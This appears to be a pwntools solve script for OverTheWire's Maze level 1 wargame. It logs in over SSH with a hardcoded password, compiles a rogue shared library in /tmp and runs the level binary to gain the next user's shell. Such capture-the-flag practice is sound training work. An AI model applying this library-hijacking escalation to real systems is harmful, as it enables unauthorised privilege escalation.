#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 1
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'hashaachon'
PORT = 2225

#context.log_level = 'debug'

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def setup_payload(sh):
    shell = sh.run('/bin/bash')
    w = log.progress("Creating /tmp/taldgan")
    sh.set_working_directory(b'/tmp/tald1')
    shell.sendline("mkdir /tmp/tald1")
    shell.sendline("cd /tmp/tald1")
    w.success("Created")
    time.sleep(0.05)
    w = log.progress("Compiling shared library...")
    shell.sendline("gcc -m32 /tmp/tald1/libc.so.4.c -o /tmp/tald1/libc.so.4 -fPIC -shared -ldl -D_GNU_SOURCE")
    w.success("compiled")

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing maze1...")
    shell = sh.run('/maze/maze1')
    w.success("maze2 shell established")
    shell.interactive()

sh = connect_to_level()
setup_payload(sh)
execute_payload(sh)
